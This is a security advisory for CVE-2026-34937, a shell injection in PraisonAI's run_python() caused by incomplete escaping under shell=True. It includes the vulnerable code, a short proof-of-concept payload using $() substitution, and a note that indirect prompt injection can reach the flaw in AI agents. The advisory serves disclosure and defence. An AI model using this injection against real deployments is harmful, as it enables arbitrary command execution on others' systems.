# [H] PraisonAI: Shell Injection in run_python() via Unescaped $() Substitution

## Summary
Severity: High
Advisory: GHSA-w37c-qqfp-c67f
CVE: CVE-2026-34937
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-w37c-qqfp-c67f
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.5.90

## Details
### Summary

`run_python()` in `praisonai` constructs a shell command string by interpolating user-controlled code into `python3 -c "<code>"` and passing it to `subprocess.run(..., shell=True)`. The escaping logic only handles `\` and `"`, leaving `$()` and backtick substitutions unescaped, allowing arbitrary OS command execution before Python is invoked.

### Details

`execute_command.py:290` (source) -> `execute_command.py:297` (hop) -> `execute_command.py:310` (sink)
```python
# source -- user-controlled code argument
def run_python(code: str, cwd=None, timeout=60):

# hop -- incomplete escaping, $ and () not handled
    escaped_code = code.replace('\\', '\\\\').replace('"', '\\"')
    command = f'{python_cmd} -c "{escaped_code}"'

# sink -- shell=True expands $() before python3 runs
    return execute_command(command=command, cwd=cwd, timeout=timeout)
    # execute_command calls subprocess.run(command, shell=True, ...)
```

### PoC
```python
# tested on: praisonai==0.0.81 (source install, commit HEAD 2026-03-30)
# install: pip install -e src/praisonai
import sys
sys.path.insert(0, 'src/praisonai')
from praisonai.code.tools.execute_command import run_python

result = run_python(code='$(id > /tmp/injected)')
print(result)

# verify
import subprocess
print(subprocess.run(['cat', '/tmp/injected'], capture_output=True, text=True).stdout)
# expected output: uid=1000(narey) gid=1000(narey) groups=1000(narey)...
```

### Impact

Any agent pipeline or API consumer that passes user or task-supplied content to `run_python()` is exposed to full OS command execution as the process user. The function is reachable via indirect prompt injection and the auto-generated Flask server deploys with `AUTH_ENABLED = False` by default when no token is configured.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-w37c-qqfp-c67f
- https://nvd.nist.gov/vuln/detail/CVE-2026-34937
- https://github.com/MervinPraison/PraisonAI
